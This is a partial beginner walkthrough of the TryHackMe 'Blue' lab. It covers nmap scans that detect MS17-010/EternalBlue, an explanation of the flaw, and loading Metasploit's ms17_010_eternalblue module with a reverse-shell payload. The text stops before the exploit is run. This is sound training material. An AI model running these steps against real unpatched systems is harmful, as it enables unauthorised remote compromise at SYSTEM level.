---
link: https://tryhackme.com/room/blue
difficulty: Easy
description: Deploy & hack into a Windows machine, leveraging common misconfigurations issues.
tags:
image: https://cdn-images.tryhackme.com/room-icons/blue-1785241443587.png
solved:
solve date:
---

<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/writeup_try_hack_me_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">Blue Writeup</p></div>

  <img src="https://cdn-images.tryhackme.com/room-icons/blue-1785241443587.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 22px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: nedmoeca</p>
    <p style="margin: 0;">Author(s): ben, DarkStar7471</p>
    <p style="margin: 0;">Difficulty: Easy</p>
    <p style="margin: 0;">Date: 30 Aug 2026</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Summary

Category: **Exploitation**, with a secondary phase of **Post-Exploitation / Credential Attacks**. Exploitation comes first and dominates the box: a Windows 7-era host exposes SMBv1 on 445, and the vulnerability is a memory-corruption bug in the SMBv1 transaction handling that yields remote code execution as SYSTEM without any credentials. The second half is genuinely a different skill. You take a raw shell, upgrade it to a full post-exploitation session, dump the local password database, and crack a hash offline. There's no lateral movement here; the initial exploit already lands you at the highest privilege level on a standalone host, so "escalation" in this room is really session upgrading rather than true privilege escalation.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 1 Recon

Press the **Start Lab Machine** button.

Start the AttackBox by pressing the **Start AttackBox** button at the top of this page. The AttackBox machine will start in Split-Screen view. If it is not visible, use the blue **Show Split View** button at the top of the page.

Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. **This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.** 

![](https://assets.tryhackme.com/additional/imgur/NhZIt9S.png)

_Art by one of our members, Varg - [THM Profile](https://tryhackme.com/p/Varg) - [Instagram](https://www.instagram.com/varghalladesign/) - [Blue Merch](https://www.redbubble.com/shop/ap/53637482) - [Twitter](https://twitter.com/Vargnaar)_

_Link to Ice, the sequel to Blue: [Link](https://tryhackme.com/room/ice)_

_You can check out the third box in this series, Blaster, here: [Link](https://tryhackme.com/room/blaster)_

-----------------------------------------

The lab machine used in this room (Blue) can be downloaded for offline usage from [https://darkstar7471.com/resources.html(opens in new tab)](https://darkstar7471.com/resources.html)[(opens in new tab)](https://darkstar7471.com/resources.html)

_Enjoy the room! For future rooms and write-ups, follow [@darkstar7471](https://twitter.com/darkstar7471) on Twitter._
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### Q1 Scan the machine. (If you are unsure how to tackle this, I recommend checking out the [Nmap](https://tryhackme.com/room/furthernmap) room)

==No answer needed==
<div align="center">
<br>
<br>
</div>

```shell
┌──(nedmoeca㉿kali)-[~/Labs/THM/Blue]
└─$ nmap -p- --min-rate 5000 -Pn 10.49.188.213 | grapo
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-30 10:38 -0400
Nmap scan report for 10.49.188.213
Host is up (0.31s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE    SERVICE
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
3389/tcp  open     ms-wbt-server
4290/tcp  filtered vrml-multi-use
5985/tcp  open     wsman
47001/tcp open     winrm
49152/tcp open     unknown
49153/tcp open     unknown
49154/tcp open     unknown
49155/tcp open     unknown
49171/tcp open     unknown
49172/tcp open     unknown
49200/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 21.39 seconds

135,139,445,3389,5985,47001,49152,49153,49154,49155,49171,49172,49200

┌──(nedmoeca㉿kali)-[~/Labs/THM/Blue]
└─$ nmap -A -p 135,139,445,3389,5985,47001,49152,49153,49154,49155,49171,49172,49200 10.49.188.213 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-30 10:48 -0400
Nmap scan report for 10.49.188.213
Host is up (0.32s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2012 R2 Datacenter 9600 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
49172/tcp open  msrpc         Microsoft Windows RPC
49200/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2012
OS CPE: cpe:/o:microsoft:windows_server_2012:r2
OS details: Microsoft Windows Server 2012 or 2012 R2
Network Distance: 3 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Datacenter 9600 (Windows Server 2012 R2 Datacenter 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: WIN-JO6REVNMMMP
|   NetBIOS computer name: WIN-JO6REVNMMMP\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-08-30T07:49:48-07:00
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h19m58s, deviation: 4h02m30s, median: -2s
|_nbstat: NetBIOS name: WIN-JO6REVNMMMP, NetBIOS user: <unknown>, NetBIOS MAC: 0a:99:14:ab:b2:13 (unknown)
| smb2-time: 
|   date: 2026-08-30T14:49:49
|_  start_date: 2026-08-30T14:18:43

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   304.12 ms 192.168.128.1
2   ...
3   323.50 ms 10.49.188.213

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.28 seconds
```

**Analysis**

| Port        | Service       | Version                                 | Analysis                                                                                                       | Simple Explanation                                                                |
| ----------- | ------------- | --------------------------------------- | -------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------- |
| 135         | msrpc         | Microsoft Windows Remote Procedure Call | RPC endpoint mapper. Directs clients to the dynamic high ports. Rarely exploitable directly on a patched host. | The switchboard operator. Tells callers which extension to dial.                  |
| 139         | netbios-ssn   | Microsoft Windows netbios-ssn           | Legacy NetBIOS session service. Its presence alongside 445 indicates backward compatibility is enabled.        | The old-fashioned way Windows machines find and talk to each other.               |
| 445         | microsoft-ds  | Windows Server 2012 R2 Datacenter 9600  | SMB file sharing. Signing disabled, blank account accepted for enumeration. **Primary target.**                | File sharing: how Windows machines hand files back and forth. This is the way in. |
| 3389        | ms-wbt-server | Microsoft Terminal Service              | RDP. Useful post-compromise for a graphical session; no credentials available yet, so not an entry point.      | Remote desktop. Useless until you have a username and password.                   |
| 5985        | http          | Microsoft HTTPAPI httpd 2.0             | WinRM over HTTP. Remote PowerShell management. Requires valid credentials.                                     | Remote command line for admins. Also needs credentials first.                     |
| 47001       | http          | Microsoft HTTPAPI httpd 2.0             | WinRM listener companion port. Same credential requirement.                                                    | Same as above, second door onto the same service.                                 |
| 49152–49200 | msrpc         | Microsoft Windows RPC                   | Dynamic RPC endpoints allocated by the port 135 mapper. Not independently exploitable.                         | The actual extensions the switchboard connects you to.                            |

**What this gives you:**

**Key finding: the target is Windows Server 2012 R2 Datacenter build 9600, hostname `WIN-JO6REVNMMMP`, in `WORKGROUP`. A standalone host, not domain-joined.** Workgroup membership rules out Active Directory attack paths entirely; there is no domain controller, no Kerberos, no domain accounts.

Focus on 445. Two lines mark it as the weak point: `message_signing: disabled` means SMB messages carry no integrity protection, and `account_used: <blank>` means the server answered a null session. It disclosed its OS, hostname, and workgroup to an unauthenticated stranger. Every other open port either brokers connections or demands credentials that are not yet available.
<div align="center">
<br>
<br>
</div>

#### Why the ephemeral ports don't need version scanning

I didn't need to include the all those high ports in the aggressive scan.

That run took a hundred and forty-five seconds, and a big chunk of it was nmap version-probing seven separate RPC endpoints that were only ever going to answer "Microsoft Windows RPC." It's wasted time if you've got a deadline.

But I want to be careful about the reason, because the "shortcut" people take away from this is usually wrong. The rule is not "high port, ignore it."

Here's what's actually going on. Those ports in the 49152-and-up range are Windows' dynamic RPC range. Windows services that speak RPC don't claim a fixed port the way a web server claims port 80. They grab a port from that range when the machine boots and then register it with the endpoint mapper, which is the service sitting on port 135. So a client that wants the task scheduler doesn't need to know where it is. It asks 135, and 135 says "today, it's on 49157."

Two consequences. First, those numbers change every time the box reboots, which is why yours won't match the numbers in any writeup you read, including mine. Second, and this is the point: those ports are already represented by port 135. Scanning them one by one tells you nothing that 135 didn't already tell you. And their identity isn't something you can banner-grab anyway. You get at it through RPC enumeration, not version detection.

So the leaner scan in this case is just the six ports that are actually distinct services:

`nmap -A -p 135,139,445,3389,5985,47001 TARGET_IP`

Now, where does that rule break down? Two places worth knowing.

A high port is not automatically RPC. If your full sweep turns up 8080, or 5432, or 27017, those are real services that somebody deliberately chose to run, and they get the full treatment. Don't skip them because the number looks big.

And on an Active Directory engagement, the RPC endpoints genuinely do matter but you wouldn't go at them with nmap. You'd use something like `impacket-rpcdump` or `rpcclient`, because what you care about is which RPC interfaces are exposed, not which port number they landed on.

The habit to build is this. Sweep every port with `-p-` so you find everything. Then version-scan only the ports you can't already explain. If port 135 explains the whole 49-thousand block, drop the block.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### Q2 How many ports are open with a port number under 1000?

==3==

```
135,139,445,
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### Q3  What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

==ms17-010==
<div align="center">
<br>
<br>
</div>

**Command**

```
nmap -p 445 --script vuln TARGET_IP
```

**Breakdown**

| Component       | Purpose                                                                                                                                           |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------- |
| `nmap`          | Port scanner, here used as a script engine rather than a port sweeper.                                                                            |
| `-p 445`        | Restrict to SMB. The `vuln` category holds well over a hundred scripts; scoping to one port keeps runtime to seconds instead of many minutes.     |
| `--script vuln` | Run every NSE script in the `vuln` category. These probe for known flaws and return a verdict, unlike version detection which only reads banners. |

**Result:**

```shell
┌──(nedmoeca㉿kali)-[~/Labs/THM/Blue]
└─$ nmap -p 445 --script vuln 10.49.188.213
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-30 12:39 -0400
Nmap scan report for 10.49.188.213
Host is up (0.33s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 25.84 seconds
```

**What MS17-010 / EternalBlue is**

SMB stands for Server Message Block, and it is simply how Windows computers share files and printers with each other over a network. Opening a shared folder on a colleague's machine means SMB is doing the work behind the scenes. Version 1 of this protocol was designed in the 1980s, and like most software that old, it was built before anyone worried much about attackers.

**Now the analogy.** Picture a post office clerk taking a large parcel that has been split across several boxes. The customer tells the clerk up front how big the whole delivery is, and the clerk clears exactly that much shelf space to hold it. Boxes then arrive one at a time, and the clerk stacks them into the reserved space.

The flaw works like this: a customer declares a small delivery, so the clerk clears only a small patch of shelf but the boxes that actually arrive are way bigger. The clerk keeps stacking anyway, and the overflow spills onto the neighbouring shelves, crushing whatever was already sitting there.

Inside a computer, those neighbouring shelves hold instructions the machine is going to run next. An attacker who chooses the spilled contents carefully doesn't just damage what's there. They replace it with their own instructions. The machine then reads those instructions and obeys, because it has no way to tell they were planted.

**Two things make this especially dangerous:**

| Property                      | What it means in practice                                                                                                                                                                  |
| ----------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| No login required             | The faulty code runs _before_ the server ever asks who you are. No username, no password, no prior access. Just network reach to port 445.                                                 |
| Runs at the highest privilege | Windows handles SMB deep inside the operating system's core, not as an ordinary program. Code that lands there arrives as `NT AUTHORITY\SYSTEM`, the most powerful account on the machine. |

That second point changes the shape of this engagement. On most boxes you get a low-privilege foothold and then hunt for a way up. Here, the first successful exploit already puts you at the top and there is nothing left to escalate to.

**Why the name.** Microsoft released the fix in security bulletin **MS17-010** on 14 March 2017. A working attack tool for the flaw, codenamed **EternalBlue**, had been built by the NSA and was leaked publicly by a group calling themselves the Shadow Brokers about a month later. In May 2017 the WannaCry ransomware worm used it to spread to hundreds of thousands of unpatched machines across the globe in just a matter of days, hitting hospitals, railways, and factories. The NotPetya attack followed weeks later using the same weakness.

So the vulnerability had a patch available two months before the worst attack using it. Every machine that fell had simply not applied it which is exactly the situation on this target.

Read the three script verdicts as three distinct outcomes:

| Script              | Verdict      | Meaning                                                                                                                                                                           |
| ------------------- | ------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `smb-vuln-ms17-010` | `VULNERABLE` | Check ran and the host failed it. Confirmed exploitable.                                                                                                                          |
| `smb-vuln-ms10-054` | `false`      | Check ran and the host passed. Confirmed not vulnerable.                                                                                                                          |
| `smb-vuln-ms10-061` | `ERROR`      | Check crashed before producing a verdict. **Inconclusive**: this is not the same as "not vulnerable," and on a real engagement it must be reported as untested rather than clean. |

**Key finding: the host is confirmed vulnerable to MS17-010 (CVE-2017-0143), an unauthenticated remote code execution flaw in SMBv1 that executes in kernel context as `NT AUTHORITY\SYSTEM`.**
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 2 Gain Access
### Q4 Start [Metasploit](https://tryhackme.com/module/metasploit)

==No answer needed==
<div align="center">
<br>
<br>
</div>

We've confirmed MS17-010 via NSE. Move from confirmation to weaponisation by finding a working implementation of the exploit rather than writing one.

**Command:**

```
msfconsole
```

**Breakdown:**

| Component         | Purpose                                                                                                                                       |
| ----------------- | --------------------------------------------------------------------------------------------------------------------------------------------- |
| `msfconsole`      | Launches the Metasploit Framework console. Takes 10–30 seconds to load its module index; wait for the `msf >` prompt.                         |

**Result:**

```shell
┌──(nedmoeca㉿kali)-[~/Labs/THM/Blue]
└─$ msfconsole
Metasploit tip: Enable verbose logging with set VERBOSE true
                                                  

                 _---------.
             .' #######   ;."
  .---,.    ;@             @@`;   .---,..
." @@@@@'.,'@@            @@@@@',.'@@@@ ".
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
     "--'.@@@  -.@        @ ,'-   .'--"
          ".@' ; @       @ `.  ;'
            |@@@@ @@@     @    .
             ' @@@ @@   @@    ,
              `.@@@@    @@   .
                ',@@     @   ;           _____________
                 (   3 C    )     /|___ / Metasploit! \
                 ;@'. __*__,."    \|--- \_____________/
                  '(.,...."/


       =[ metasploit v6.4.146-dev                               ]
+ -- --=[ 2,668 exploits - 1,343 auxiliary - 2,582 payloads     ]
+ -- --=[ 435 post - 57 encoders - 14 nops - 12 evasion         ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > 
```

Before we run anything else, let's talk about what we've just opened, because "Metasploit" gets thrown around as if everyone already knows about it.

At its simplest, Metasploit is a library of pre-written attack code plus the machinery to configure it and fire it. That's it. Two halves: a catalogue, and a control panel for the catalogue. Instead of finding an exploit script online and fixing whatever is broken in it, you load a maintained module, fill in a few settings, and run.

Think about the alternative for a second. Without it, you know the target is vulnerable to MS17-010. Now you need working exploit code. You go looking online, you find a Python script somebody wrote in 2017, and then you spend the afternoon making it run. It wants Python 2, or an old version of a library, or it's got hardcoded values from the author's own lab. That's a real skill and you will need it. But it is not the skill this room is teaching, and it isn't where the interesting part of this attack is.

Metasploit collapses that. Somebody already wrote the exploit, somebody maintains it, and it's sitting in the catalogue on your machine right now. You pick it, you fill in a handful of settings, you run it.

Now, the catalogue is organised, and understanding the organisation is most of what makes the tool usable.

Every module has a path, like a file path, and the first word tells you what kind of thing it is. `exploit` means it breaks in. `auxiliary` means it helps without breaking in, scanners, checkers, brute-forcers. `post` means it runs after you're already inside. There are a few more, but those three cover almost everything you'll touch early on.

After that first word, the path just narrows down. `exploit/windows/smb/ms17_010_eternalblue` reads as: it's an exploit, it targets Windows, it goes through SMB, and it's this specific attack. Once you can read a module path, you can look at a list of thirty search results and know which ones are irrelevant without reading a single description.

There's a second concept that trips people up, and it's the difference between an **exploit** and a **payload**.

The exploit is the way in. It's the flaw you're abusing. In our case, the memory overflow in SMBv1. Its entire job is to get the target to run some code of your choosing.

The payload is _that code_. It's what actually runs once you're through the door. And critically, they're separate and interchangeable. The same EternalBlue exploit can deliver a plain command shell, or a full Meterpreter session, or a single command that adds a user and exits. You pick the door and you pick what walks through it, independently.

Two more things and we'll run it.

Every module has settings, and you'll see them marked required or optional. The required ones with no value are your checklist. If something's marked required and it's empty, the module won't run.

And notice, this is the part I want you to hold onto, the framework hands you defaults for a lot of these. Some of those defaults are fine. Some of them are quietly wrong for your situation, and it will not warn you. We're about to hit exactly that with two settings, and if we accepted both defaults the exploit would succeed and we'd get nothing back. So the habit is: read every setting before you fire, including the ones that already have values in them.

If your're looking to learn Metasploit:

| Resource                                                                                     | Format                         | Cost            | Notes                                                                                                                                                                                                                                                                                   |
| -------------------------------------------------------------------------------------------- | ------------------------------ | --------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [HTB Academy - Using the Metasploit Framework](https://academy.hackthebox.com/app/module/39) | Guided course with exercises   | Paid (cubes)    | The most complete single treatment. Covers module taxonomy, sessions, payload generation, the backing database, and resource scripts as one coherent system rather than as isolated tasks. Start here if you only pick one.                                                             |
| [TryHackMe - Metasploit module](https://tryhackme.com/module/metasploit)                     | Three guided rooms in sequence | First room free | Introduction covers the framework's components; Exploitation covers scanning and running exploits against varied targets; Meterpreter goes deep on in-memory payloads and post-exploitation. The three map almost exactly onto sections 2 and 3 of this walkthrough, so take them next. |
Every resource I've mentioned teaches you to operate the tool. None of them teach you to understand the vulnerability underneath it, and the two are easy to confuse. It is entirely possible to compromise a host through a Metasploit module while having no idea what the flaw is or why it works  which produces someone who is helpless the moment no module exists.

Build the opposite habit. When a module is selected, read the CVE and the vendor advisory it references before running it. In this room that means Microsoft's MS17-010 bulletin and CVE-2017-0143. The framework is a delivery mechanism; the vulnerability is the thing worth understanding.

<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### Q5 Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

==exploit/windows/smb/ms17_010_eternalblue==
<div align="center">
<br>
<br>
</div>

**Command:**

```
search ms17-010
```

**Breakdown**

| Component         | Purpose                                                                                                                                       |
| ----------------- | --------------------------------------------------------------------------------------------------------------------------------------------- |
| `search ms17-010` | Queries the local module database for anything matching the bulletin ID. Matches against module names, descriptions, references, and aliases. |

**Result:**

```shell
msf > search ms17-010

Matching Modules
================

   #   Full Name                                      Disclosure Date  Rank     Check  Name
   -   ---------                                      ---------------  ----     -----  ----
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   Yes    MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'

msf > 
```

Every module lives at a filesystem-style path, and the first segment tells you what the module _does_:

| Prefix       | Purpose                                                                     | Example from this search                   |
| ------------ | --------------------------------------------------------------------------- | ------------------------------------------ |
| `exploit/`   | Breaks into a system. Attacks a flaw to gain execution.                     | `exploit/windows/smb/ms17_010_eternalblue` |
| `auxiliary/` | Supports the attack without breaking in: scanning, checking, brute-forcing. | `auxiliary/scanner/smb/smb_ms17_010`       |
| `post/`      | Runs after access is already gained.                                        | (used in section 3)                        |

The remaining segments narrow it down: `windows` is the target platform, `smb` is the service attacked, and the last part names the specific exploit.

Lines beginning `\_ target:` are **not modules**. They are variants inside module 0, each carrying a memory layout tuned to one Windows version - the exploit must know where things sit in memory to place its overwrite correctly, and that differs between builds. `Automatic Target` fingerprints the host over SMB and selects a layout, which is more reliable than choosing by hand.

The `Rank` column estimates reliability. `average` on EternalBlue reflects a real property of the attack: it corrupts kernel memory, so a mistimed or mismatched attempt can crash the target rather than exploit it. You expect to occasionally need a retry.

**What this gives you**

**Key finding: the exploit path is `exploit/windows/smb/ms17_010_eternalblue`.** Record it as the room's answer.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### Q6 Show options and set the one required value. What is the name of this value? (All caps for submission)

==RHOSTS==
<div align="center">
<br>
<br>
</div>

So here we want to Load the module and inspect required options. We've just identified the path and now we just want to determine what configuration it requires before firing anything at the target.

**Commands:**

```
use 0
```

```
show options
```

**Breakdown:**

|Component|Purpose|
|---|---|
|`use 0`|Loads a module by its index from the last search. `use exploit/windows/smb/ms17_010_eternalblue` is equivalent and safer in a writeup, since index numbers shift as the module database changes between versions.|
|`show options`|Prints every setting the loaded module and its payload accept, marking which are mandatory and what each currently holds.|

**Result**

```shell
msf > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Win
                                             dows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows
                                              Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded
                                             Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.19.129   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf exploit(windows/smb/ms17_010_eternalblue) > 
```

Two machines are involved, and Metasploit names their settings from the attacker's point of view. Anything beginning `R` describes the **remote** machine - the target. Anything beginning `L` describes the **local** machine - the attacker.

| Setting  | Meaning                                                                 | Value here                            |
| -------- | ----------------------------------------------------------------------- | ------------------------------------- |
| `RHOSTS` | Address of the machine being attacked.                                  | The target's IP.                      |
| `RPORT`  | Port on the target to attack.                                           | 445, already correct for SMB.         |
| `LHOST`  | Address the target should connect back to - the attacker's own address. | Must be the VPN interface address.    |
| `LPORT`  | Port on the attacker where the connection is caught.                    | 4444 by default; any free port works. |

The reason the attacker's address must be supplied at all is the direction the connection travels. A _bind_ shell would have the target open a listening port and wait for the attacker to dial in - which firewalls and network address translation usually block. A **reverse** shell inverts it: the exploit plants code that makes the target dial _out_ to the attacker, who is already listening. Outbound connections are rarely blocked, which is why reverse shells are the default.

That inversion means the payload has the attacker's address hardcoded into it before it is sent. Set `LHOST` wrong and the exploit still succeeds the target is still compromised but it dials a number that goes nowhere, and no session ever appears.

Note the `SMBUser`, `SMBPass` and `SMBDomain` fields are all marked `Required: no`. That is how severe the vulnerability is: no credentials are needed.

**What this gives you**

**Key finding: `RHOSTS` is the sole required option with no value set.** Record `RHOSTS` as the room's answer.

**Flag the auto-populated `LHOST` as wrong.** Metasploit selected `192.168.19.129`, a local virtualisation interface address rather than the VPN address the target can reach. Verify the correct value before running the exploit; leaving this unchanged produces an exploit that reports success while delivering no session.

Note also that the default payload loaded as `windows/x64/meterpreter/reverse_tcp`. The room's exercise expects a plain command shell so that upgrading it becomes a later step, so override this rather than accepting the default.

**Next**

Three values need correcting: payload, target address, and listen address. Determine the attacker's VPN address and apply all three.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### Q7 Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:<br>`set payload windows/x64/shell/reverse_tcp`<br>With that done, run the exploit!

==No answer needed==
<div align="center">
<br>
<br>
</div>

First identify your VPN address.

In the previous Section we flagged the auto-populated `LHOST` value as belonging to a local virtualization adapter rather than the VPN. Determine the address the target can actually reach before configuring the payload.

**Command**

```
ifconfig tun0
```

**Breakdown**

|Component|Purpose|
|---|---|
|`ifconfig`|Prints network interface configuration. Run from inside msfconsole, which passes unrecognised commands to the system shell and echoes them back prefixed `[*] exec:`.|
|`tun0`|Restricts output to the VPN tunnel interface. Omitting it lists every interface, making the relevant address harder to pick out. `ip addr show tun0` is the modern equivalent on systems without `ifconfig`.|

**Result**

```shell
msf exploit(windows/smb/ms17_010_eternalblue) > ifconfig tun0
[*] exec: ifconfig tun0

tun0: flags=209<UP,POINTOPOINT,RUNNING,NOARP>  mtu 1380
        inet 192.168.134.39  netmask 255.255.192.0  destination 192.168.134.39
        inet6 fe80::aaa6:5df4:6fb5:a3df  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 1029  bytes 41200 (40.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1759  bytes 247988 (242.1 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Here's the reason why we did this step:

A machine holds several IP addresses at once, one per network interface, and each is only meaningful on the network that interface connects to. Reaching a target across a VPN means using the address assigned to the tunnel and no other address on the machine is routable from the lab side.

`tun0` is created by the VPN client when the connection is established. It is a virtual interface: traffic written to it is encrypted, wrapped, and sent through the physical connection to the VPN endpoint, which unwraps it onto the lab network. It is the only path into the lab.

The `inet` value on `tun0`. That's your LHOST.

Expect this address to change. It is reassigned on each VPN reconnection, so re-run this command after any disconnection rather than reusing a noted value.

**Next**

Both endpoints are now known. Configure the module with the target address, the correct listen address, and a payload appropriate to the room's exercise.

**Commands**

```
